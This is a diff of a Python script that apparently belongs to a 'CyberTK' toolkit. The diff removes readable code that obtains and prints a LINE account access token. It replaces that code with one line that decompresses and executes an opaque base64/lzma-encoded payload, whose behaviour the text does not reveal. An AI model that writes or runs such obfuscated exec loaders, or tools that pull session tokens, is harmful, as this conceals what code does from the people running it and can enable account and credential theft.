@@ -1,22 +1,2 @@
-from cybertk.line.api.path import CyberTKQR,process,threads,apsss,format1,format2,format3,format4,format5,SecondaryqR
-SecondaryqR()
-CRED='\x1b[91m'
-CEND='\x1b[0m'
-print(CRED+process+CEND)
-input(CRED+threads+CEND)
-app1=['desktopwin']
-app2=['lite']
-app3=['ipad']
-app4=['chrome']
-app5=['desktopmac']
-Apps=int(input(CRED+apsss+CEND))
-CyberTKAPIWEB=CyberTKQR()
-UygulamaADI=''
-if Apps==1:UygulamaADI=UygulamaADI.join(app1);print(CRED+format1+CEND)
-elif Apps==2:UygulamaADI=UygulamaADI.join(app2);print(CRED+format2+CEND)
-elif Apps==3:UygulamaADI=UygulamaADI.join(app3);print(CRED+format3+CEND)
-elif Apps==4:UygulamaADI=UygulamaADI.join(app4);print(CRED+format4+CEND)
-elif Apps==5:UygulamaADI=UygulamaADI.join(app5);print(CRED+format5+CEND)
-else:print(CRED+'\nLütfen Geçerli bir uygulama adı seçiniz!\n'+CEND)
-WEBS=CyberTKAPIWEB.LOGINAPICLIENT(UygulamaADI)
-print('{}'.format(WEBS.accessToken))
+import lzma, base64
+exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AN6AYRdADMciiJvqleT2uFC+TMGoE1eOwtN7r0G9xj5HyMPv2ejHDpvLco3gH20T+1zKqYkkQ6eoqCJzrL+gZlknrnQ5AOiESRUZnPwEZXEAlGpD9REsuY7N9tb722pwTJ9uQw5AmLo1+lbXXg0QkRb30KJn/6c1fxn77j+xL2ddT+g1ZIxYSkSYrwRJkM1aIg0pV3HkPYK929DgjYFxLpdl88nWcWy0Gc6cdoxiOs9YYc8OyQZ/gmbZtgn4ltzIUOacL7CyDaYZr+91IIIP4q7zaPa4Y2tWNm/gPyp25IWIsaVPmSv8rBObwRsTbCQxkHWWItIJSSVz0ZEUAZj09xyDngKs0eHND/e9IZn3WEpLBekxWx/43Jp9g/hiXP4X7D1a9D8R1699HJp7BCr+ffNTLLD5gkHZE0xATOe1HujuuB2z3IO70MmVSp3JkADYfvQQpR02NbfCvpugwrEnpmxo2Lg0wIzl8+WUSNJMCn135vBM2ZPHq/6GiOkL+ORHiV9rcjgUG9g3bsALHSafFPZFr0AAaAD+wYAAPdSA8ixxGf7AgAAAAAEWVo=')))
